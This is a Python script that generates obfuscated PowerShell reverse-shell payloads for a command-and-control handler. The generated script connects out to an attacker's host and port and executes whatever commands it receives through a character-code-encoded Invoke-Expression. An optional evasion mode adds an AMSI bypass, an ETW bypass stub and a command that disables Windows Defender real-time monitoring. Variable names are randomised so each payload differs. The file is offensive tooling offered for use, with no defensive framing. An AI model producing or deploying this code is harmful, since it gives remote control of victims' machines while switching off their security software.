import random
import string
import os
from datetime import datetime

# Ensure payload directory exists
os.makedirs(os.path.join("server", "payloads"), exist_ok=True)

def rand_name(length=8):
    return ''.join(random.choices(string.ascii_letters, k=length))
# make sure to change the ip to your c2 or handler ip.

def generate_polymorphic_ps(host="localhost", port=1443, evasion_enabled=False):
    folder = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'server', 'payloads'))
    os.makedirs(folder, exist_ok=True)

    filename = f"ps_payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.ps1"
    path = os.path.join(folder, filename)

    v = {key: rand_name() for key in [
        "main", "client", "stream", "reader", "writer", "cmd", "resp", "iex"
    ]}

    # --- Evasion Blocks ---
    amsi_bypass = """
$A='System.Management.Automation.AmsiUtils';
$B=[Ref].Assembly.GetType($A);
$B.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
    """.strip()

    # ETW bypass example (can be replaced with better/obfuscated variant)
    etw_bypass = """
try {
    [System.Reflection.Assembly]::Load([Convert]::FromBase64String(
    '...')) | Out-Null
} catch {}
    """.strip()

    defender_disable = """
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
} catch {}
    """.strip()

    evasion_code = ""
    if evasion_enabled:
        evasion_code = "\n".join([amsi_bypass, etw_bypass, defender_disable])

    ps = f'''
{evasion_code}

Function {v["main"]} {{
    ${v["client"]} = New-Object System.Net.Sockets.TcpClient
    try {{
        ${v["client"]}.Connect('{host}', {port})
    }} catch {{
        return
    }}

    ${v["stream"]} = ${v["client"]}.GetStream()
    ${v["reader"]} = New-Object System.IO.StreamReader(${v["stream"]})
    ${v["writer"]} = New-Object System.IO.StreamWriter(${v["stream"]})
    ${v["writer"]}.AutoFlush = $true
    ${v["iex"]} = ([char]73)+([char]110)+([char]118)+([char]111)+([char]107)+([char]101)+([char]45)+([char]69)+([char]120)+([char]112)+([char]114)+([char]101)+([char]115)+([char]115)+([char]105)+([char]111)+([char]110)

    while ($true) {{
        ${v["cmd"]} = ${v["reader"]}.ReadLine()
        if (-not ${v["cmd"]}) {{ continue }}
        try {{
            ${v["resp"]} = &${v["iex"]} ${v["cmd"]} 2>&1 | Out-String
        }} catch {{
            ${v["resp"]} = "ERROR: $_"
        }}
        ${v["resp"]} += "`nPS " + (pwd).Path + "> "
        ${v["writer"]}.WriteLine(${v["resp"]})
    }}
}}
{v["main"]}
'''.strip()

    with open(path, 'w') as f:
        f.write(ps)

    return filename
